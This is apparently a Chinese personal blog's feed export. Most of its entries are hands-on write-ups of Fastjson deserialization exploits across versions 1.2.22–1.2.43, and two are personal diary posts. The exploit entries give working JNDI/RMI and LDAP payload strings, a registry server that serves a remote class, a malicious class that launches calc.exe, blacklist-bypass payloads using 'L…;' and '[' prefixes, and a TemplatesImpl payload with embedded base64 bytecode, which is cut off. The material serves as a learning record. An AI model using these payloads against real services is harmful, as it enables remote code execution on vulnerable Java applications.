class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;&#125;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（1.2.25-1.2.43）</title>
    <link href="/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-43%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-43%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-25-1-2-43"><a href="#Fastjson1-2-25-1-2-43" class="headerlink" title="Fastjson1.2.25-1.2.43"></a>Fastjson1.2.25-1.2.43</h1><p>在老地方增加了报错。如果是开头两个LL。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082137161.png" alt="QQ截图20220308213629"></p><p>这里可以直接用之前的版本绕过POC。利用[</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>over。</p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（1.2.25-1.2.42）</title>
    <link href="/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-42%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-42%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson（1-2-25-1-2-42）"><a href="#Fastjson（1-2-25-1-2-42）" class="headerlink" title="Fastjson（1.2.25-1.2.42）"></a>Fastjson（1.2.25-1.2.42）</h1><p>增加了黑名单。过滤了<strong>L、；</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082116245.png" alt="QQ截图20220308210454"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082128495.png" alt="QQ截图20220308212311"></p><p>但是这里却是一个循环删除。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082128978.png" alt="QQ截图20220308212625"></p><p>所以没啥用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（1.2.25-1.2.41）</title>
    <link href="/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-41%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-41%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-25-1-2-41"><a href="#Fastjson1-2-25-1-2-41" class="headerlink" title="Fastjson1.2.25-1.2.41"></a>Fastjson1.2.25-1.2.41</h1><p>还是利用之前的代码。</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Exploit</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>, <span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>,referenceWrapper);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>还是之前的代码。但是变化了。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081954585.png" alt="QQ截图20220308185949"></p><p>清楚的看到，他是不支持com.sun.rowset.JdbcRowSetImpl。<br>跟进一下代码。<br>一路跟进会在这里产生报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081922659.png" alt="QQ截图20220308192105"></p><p>这里很显然禁止了以com.sun开头的类。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081954160.png" alt="QQ截图20220308192640"></p><p>如果这里满足条件也就是开启了<code>autoTypeSupport</code>，实现代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>就会来到这里。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081928989.png" alt="QQ截图20220308192804"></p><p>但是开启之后，这里还是会满足条件。继续进入黑名单。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081932475.png" alt="QQ截图20220308193159"></p><p>去看一下最后的<strong>loadClass</strong>处理类。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081954538.png" alt="QQ截图20220308193309"></p><p>不解释代码了。<strong>一个去头，一个去头去尾。</strong><br>这样就绕过了黑名单。试一试。</p><h2 id="更新换代POC"><a href="#更新换代POC" class="headerlink" title="更新换代POC"></a>更新换代POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>这里在加入<code>[</code>会产生报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081951719.png" alt="QQ截图20220308195108"></p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>这应该是一种特殊的格式。不然就会报错。可根据提示来修改。over。</p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>致每一个努力的人</title>
    <link href="/2022/03/08/%E8%87%B4%E6%AF%8F%E4%B8%80%E4%B8%AA%E5%8A%AA%E5%8A%9B%E7%9A%84%E4%BA%BA/"/>
    <url>/2022/03/08/%E8%87%B4%E6%AF%8F%E4%B8%80%E4%B8%AA%E5%8A%AA%E5%8A%9B%E7%9A%84%E4%BA%BA/</url>
    
    <content type="html"><![CDATA[<p>其实越长大就发现想要在一个领域做好，要付出很多。最近学习虽然都是复习之前学的，但是还是学了就忘，手敲代码还是不够熟练。可能确实有些小笨，感觉身边的人一次就学会了。算了也不说这些锤头丧气的话，继续冲！毕竟cuit，夜晚11点多的银兴大道不止只有你。就不花多时间写了。就是简单记录一下。顺便吐槽，密码学老师讲课真的差劲。（我严重怀疑他到底会不会！！！）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091323190.jpg"></p><p>还有还有！！今天第一次吃这个东西，没想到还挺好吃。下次回去让婆婆给我做这道菜！！（姑且称它狮子头包蛋。哈哈哈哈哈）<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091325433.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>历程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>历程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>宝贝女生节快乐</title>
    <link href="/2022/03/08/%E5%AE%9D%E8%B4%9D%E5%A5%B3%E7%94%9F%E8%8A%82%E5%BF%AB%E4%B9%90/"/>
    <url>/2022/03/08/%E5%AE%9D%E8%B4%9D%E5%A5%B3%E7%94%9F%E8%8A%82%E5%BF%AB%E4%B9%90/</url>
    
    <content type="html"><![CDATA[<p>一年一度的三八节到啦。哦豁我得先去上密码学了。待会在来叨叨两句。<br>疫情太难受了，如果不是疫情可能我现在在跟宝贝玩。今天跟宝贝点了杯奶茶，看样子还挺开心得。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091319667.png" alt="202203081824384"></p><p>离清明节越来越近，感觉好期待一起去峨眉山。<br>最后在祝宝贝女生节快乐哟。</p>]]></content>
    
    
    <categories>
      
      <category>学生时代的爱情</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爱情</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（JdbcRowSetImpl）</title>
    <link href="/2022/03/08/Fastjson%EF%BC%88JdbcRowSetImpl%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%88JdbcRowSetImpl%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson（JNDI-RMI"><a href="#Fastjson（JNDI-RMI" class="headerlink" title="Fastjson（JNDI+RMI)"></a>Fastjson（JNDI+RMI)</h1><p>🐎*的，真就潜入JNDI是不行。手敲还是敲不对！<br>有一说一承认了，要不然不会弄这么久，就是还是没有搞懂JNDI注入。</p><h2 id="JNDIServer"><a href="#JNDIServer" class="headerlink" title="JNDIServer"></a>JNDIServer</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exloit&quot;</span>,<br>                <span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:80/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference(String className, String factory, String factoryLocation)<br></code></pre></td></tr></table></figure><p>参数1：<code>className</code> - 远程加载时所使用的类名</p><p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p><p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p><p><strong>并且我们这里注意到Factory命名必须带上包的路径（就是需要完整的路径）。</strong>不然无法复现成功。<br><strong>当然，要把一个对象绑定到<code>RMI注册表</code>中，这个对象需要继承<code>UnicastRemoteObject</code>，但是<code>Reference</code>没有继承它，所以我们还需要封装一下它，用 <code>ReferenceWrapper</code> 包裹一下<code>Reference</code>实例对象，这样就可以将其绑定到<code>RMI注册表</code></strong></p><p>当去访问127.0.0.1&#x2F;Exloit.class的时候找不到。就会去访问我们设置的路径去执行恶意类代码。<strong>并且会调用其中的无参构造函数</strong>，还可以利用java的static代码块来写恶意代码，static代码块的代码在class文件被加载过后就会立即执行，且只执行一次。</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>这里就说关键部分。因为这个很多模块的函数调试不进去。<br>在之前<strong>fastjson基于TemplatesImpl触发链中</strong>，我们直接从这里进去。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535811.png" alt="QQ截图20220308151631"></p><p>会调试很久很久很久直接来到这里。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535859.png" alt="QQ截图20220308151706"></p><p>建议直接这里下个断点。位置如下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535460.png" alt="QQ截图20220308151802"></p><p>跟进这里又看不到。</p><p>建议直接断点来到这里。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535780.png" alt="QQ截图20220308152204"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535322.png" alt="QQ截图20220308152226"></p><p>跟进。**connect()**。来到这里，我们跟进看一下this.getDataSourceName()的值。发现就是我们传入的参数。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081524409.png" alt="QQ截图20220308152417"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535007.png" alt="QQ截图20220308152402"></p><p>所以就造成了JNDI注入。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplPoc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/xsw6a.Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(payload);<br><span class="hljs-comment">//        JSON.parseObject(payload);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Exploit</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>记得自己开启一个127.0.0.1:80的服务，并且将恶意类.class放入进去。我的电脑本机python3可以开启服务但是弹不出计算器。不知道原因。</p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（TemplateImpl）</title>
    <link href="/2022/03/07/Fastjson%EF%BC%88TemplateImpl%EF%BC%89/"/>
    <url>/2022/03/07/Fastjson%EF%BC%88TemplateImpl%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson（TemplatesImp）"><a href="#Fastjson（TemplatesImp）" class="headerlink" title="Fastjson（TemplatesImp）"></a>Fastjson（TemplatesImp）</h1><p>之前好几篇文章都是基于触发恶意类（TemplatesImp）调用getter方法。那么在之前分析的<strong>Fastjson</strong>中在反序列化的时候也会调用getter方法。所以就可以连起来了。</p><p><strong>基于1.2.22-1.2.24版本</strong></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>弄了我半天，才发现自己的弹计算器的命令输错了。我无语了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String s=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABRMeHN3NmEvRmFzdGpzb25FaXZsOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAJaGFGbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQARRmFzdGpzb25FaXZsLmphdmEMAAgACQcALwwAMAAxAQAIY2FsYy5leGUMADIAMwEAEnhzdzZhL0Zhc3Rqc29uRWl2bAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAEACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAATAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcAGAADAAEAEQAZAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAYAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGgAbAAIADwAAAAQAAQAcAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABsACAAcAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; 